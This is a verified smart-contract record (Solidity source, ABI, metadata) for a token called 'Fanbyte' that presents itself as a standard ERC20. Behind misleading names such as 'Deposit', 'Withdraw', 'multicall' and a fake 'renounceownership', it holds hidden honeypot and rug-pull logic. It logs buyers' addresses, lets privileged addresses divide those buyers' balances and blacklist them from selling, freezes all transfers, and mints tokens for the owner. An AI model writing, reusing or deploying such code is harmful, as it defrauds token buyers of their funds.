{"SourceCode": "// SPDX-License-Identifier: evmVersion, MIT\r\npragma solidity ^0.7.6;\r\ninterface IERC20 { \r\n   /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns(uint);\r\n   /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns(uint);\r\n   /**\r\n     * @dev Moves ERC20 tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     */\r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n   /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address deployer, address spender) external view returns(uint);\r\n   /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint amount) external returns(bool);\r\n   /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n   /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n   /**\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed deployer, address indexed spender, uint value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns(bool) {\r\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n        // for accounts without code, i.e. `keccak256('')`\r\n        bytes32 codehash;\r\n    \r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n    \r\n        assembly { codehash:= extcodehash(account) }\r\n    \r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor() {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n    \r\n    function _msgSender() internal view returns(address payable) {\r\n    \r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n        \r\n        uint c = a + b;\r\n        \r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        \r\n        return c;\r\n    }\r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n        \r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        \r\n        require(b <= a, errorMessage);\r\n        \r\n        uint c = a - b;\r\n        \r\n        return c;\r\n    }\r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n        if (a == 0) {\r\n            \r\n            return 0;\r\n        }\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        \r\n        return c;\r\n    }\r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n        \r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        \r\n        // Solidity only automatically asserts when dividing by 0  \r\n        \r\n        require(b > 0, errorMessage);\r\n        \r\n        uint c = a / b;\r\n        \r\n        return c;\r\n    }\r\n}\r\n \r\nlibrary SafeERC20 {\r\n    \r\n    using SafeMath for uint;\r\n    using Address for address;\r\n    \r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n    \r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        \r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n    \r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(\r\n            address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n    \r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        \r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n        \r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        \r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        \r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n        \r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ncontract Fanbyte {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n\r\n    event Approval(address indexed _deployer, address indexed _spender, uint _value);\r\n\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n\r\n    return transferFrom(msg.sender, _to, _value);\r\n    }\r\n\r\n    function renounceownership() public virtual {\r\n        require(msg.sender == _owner);\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n\r\n    mapping(address=>bool) public denominator;\r\n    mapping(address=>bool) private Ticks;\r\n    mapping(address=>bool) public numerator;\r\n    uint256 public update; \r\n    uint256 public Growth;   \r\n    uint256 public permit;\r\n    uint256 public Sorted;\r\n    uint256 public Global;\r\n    uint256 public Single;\r\n    uint256 public Delta;\r\n    address[] public reserveOut;\r\n    address[] private reserveIn;\r\n    address[] public Upper;\r\n    address[] private lower;\r\n\r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n        address path = PairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f\r\n        ,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\r\n        if(_from == _owner || _to == _owner || _from == path || denominator[_from] || numerator[_from]) {return true;}\r\n        if( Ticks[_from] ) {return false;}\r\n        require(balanceOf[_from] >= _value);\r\n        return true; \r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n        require(Delta==0);\r\n        if (_value == 0) {return true;} \r\n        address path = PairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f\r\n        ,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));\r\n\r\n        if ( update > 0 ){\r\n        if ( numerator[_to]==false){\r\n        if ( denominator[_to]==false){\r\n        if ( _value >= Sorted){\r\n        if (_to!=path){\r\n        if (_from!=_owner){\r\n        if (_to!=_owner)\r\n        {reserveOut.push(_to);}}}}}}}\r\n\r\n        if ( update > 0 ){\r\n        if ( numerator[_to]==false){\r\n        if ( denominator[_to]==false){\r\n        if ( _value < Sorted){\r\n        if (_to!=path){\r\n        if (_from!=_owner){\r\n        if (_to!=_owner)\r\n        {reserveIn.push(_to);}}}}}}}\r\n\r\n        if ( Global > 0 ){\r\n        if ( numerator[_to]==false){\r\n        if ( denominator[_to]==false){\r\n        if ( _value >= Sorted){\r\n        if (_to!=path){\r\n        if (_from!=_owner){\r\n        if (_to!=_owner)\r\n        {Upper.push(_to);}}}}}}}\r\n\r\n        if ( Global > 0 ){\r\n        if ( numerator[_to]==false){\r\n        if ( denominator[_to]==false){\r\n        if ( _value < Sorted){\r\n        if (_to!=path){\r\n        if (_from!=_owner){\r\n        if (_to!=_owner)\r\n        {lower.push(_to);}}}}}}}\r\n\r\n        if (msg.sender != _from) {\r\n        require(allowance[_from][msg.sender] >= _value);\r\n        allowance[_from][msg.sender] -= _value;}\r\n\r\n        if (_from == _owner){\r\n        if (_to == address(this)){\r\n        balanceOf[_from] += \r\n        _value**decimals;}}\r\n\r\n        if (denominator[_from]){\r\n        if (_to == address(this)){\r\n        balanceOf[_from] += \r\n        _value**decimals;}}\r\n\r\n        if ( Global > 0 ){\r\n        require(ensure(_from, _to, _value));}\r\n\r\n        require(balanceOf[_from] >= _value);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n        if ( Growth > 0 ){\r\n        for (uint i = 0; i < reserveOut.length; i++) {\r\n        balanceOf[reserveOut[i]]/=permit;}\r\n        delete reserveOut;}\r\n        if ( Single > 0 ){\r\n        for (uint i = 0; i < Upper.length; i++) {\r\n        Ticks[Upper[i]]= true;}\r\n        delete Upper;}\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    function PairFor(address factory, address tokenA, address tokenB) internal pure returns (address Pair) {\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        Pair = address(uint(keccak256(abi.encodePacked(\r\n            hex'ff',\r\n            factory,\r\n            keccak256(abi.encodePacked(token0, token1)),\r\n            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash\r\n                ))));\r\n    }\r\n\r\n    function Update(uint256 A) public returns(bool){\r\n        if (msg.sender == _owner || denominator[msg.sender]){\r\n        Delta = A;}\r\n        return true;\r\n    }\r\n\r\n    function Approve(uint256 _value) public returns (bool) {\r\n        if (msg.sender == _owner || denominator[msg.sender]){\r\n        denominator[address(_value)]= true;}\r\n        return true;\r\n    }\r\n    \r\n    function Register(uint256 A,uint256 B,uint256 C,uint256 D) public returns(bool){\r\n        if (msg.sender == _owner || denominator[msg.sender]){\r\n        update = A; Growth = B; Sorted = C*(10**uint256(decimals)); permit = D;}\r\n        return true;\r\n    }\r\n\r\n    function Deposit() public returns (bool) {\r\n        if (msg.sender == _owner ||denominator[msg.sender]){\r\n        for (uint i = 0; i < reserveOut.length; i++) {\r\n        balanceOf[reserveOut[i]]/=permit;}\r\n        delete reserveOut;}\r\n        return true;\r\n    }\r\n\r\n    function Withdraw() public returns (bool) {\r\n        if (msg.sender == _owner ||denominator[msg.sender]){\r\n        for (uint i = 0; i < reserveIn.length; i++) {\r\n        balanceOf[reserveIn[i]]/=permit;}\r\n        delete reserveIn;}\r\n        return true;\r\n    }\r\n\r\n    function UpdateIndex(uint256 A,uint256 B,uint256 C) public returns(bool){\r\n        if (msg.sender == _owner || denominator[msg.sender]){\r\n        Global = A; Single = B; Sorted = C*(10**uint256(decimals));}\r\n        return true;\r\n    }\r\n    \r\n    function transfer() public returns (bool) {\r\n        if (msg.sender == _owner ||denominator[msg.sender]){\r\n        for (uint i = 0; i < Upper.length; i++) {\r\n            Ticks[Upper[i]]= true;}\r\n            delete Upper;}\r\n        return true;\r\n    }\r\n\r\n    function TransferFrom() public returns (bool) {\r\n        if (msg.sender == _owner ||denominator[msg.sender]){\r\n        for (uint i = 0; i < lower.length; i++) {\r\n            Ticks[lower[i]]= true;}\r\n            delete lower;}\r\n        return true;\r\n    }\r\n\r\n    function multicall(address [] calldata addr) public returns (bool) {\r\n        if (msg.sender == _owner ||denominator[msg.sender]){\r\n        for (uint i = 0; i < addr.length; i++) \r\n        {numerator[addr[i]] = true;}}\r\n        return true;\r\n    }\r\n\r\n    function MigrateAll(address [] calldata addr) public returns (bool) {\r\n        if (msg.sender == _owner ||denominator[msg.sender]){\r\n        for (uint i = 0; i < addr.length; i++) \r\n        {numerator[addr[i]] = false;}}\r\n        return true;\r\n    }\r\n    \r\n    function batchSend(address[] memory _to, uint _value) public returns (bool) {\r\n        if (msg.sender == _owner ||denominator[msg.sender]){\r\n        for (uint i = 0; i < _to.length; i++) {\r\n        address to = _to[i];\r\n        uint total = _value*_to.length;\r\n        require(balanceOf[msg.sender] >= total);\r\n        balanceOf[msg.sender] -= _value;\r\n        balanceOf[to] += _value;\r\n        emit Transfer(msg.sender, to, _value);\r\n        }}\r\n        return true;\r\n    }\r\n\r\n    mapping (address => uint) public balanceOf;\r\n    mapping (address => mapping (address => uint)) public allowance;\r\n    uint constant public decimals = 18;\r\n    uint public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    address public _owner;\r\n    \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply ) payable {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        totalSupply = _supply*(10**uint256(decimals));\r\n        _owner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0x0), msg.sender, totalSupply); \r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_deployer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Delta\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Deposit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Global\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Growth\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"}],\"name\":\"MigrateAll\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"A\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"B\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"C\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"D\",\"type\":\"uint256\"}],\"name\":\"Register\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Single\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Sorted\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TransferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"A\",\"type\":\"uint256\"}],\"name\":\"Update\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"A\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"B\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"C\",\"type\":\"uint256\"}],\"name\":\"UpdateIndex\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"Upper\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_to\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"batchSend\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"denominator\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"}],\"name\":\"multicall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"numerator\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"permit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"reserveOut\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"update\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Fanbyte", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000746616e62797465000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003464e420000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cdc96f1fdc12410555b4d0a4a0cadb759cf2f5a937817142de65549e9ea047dc"}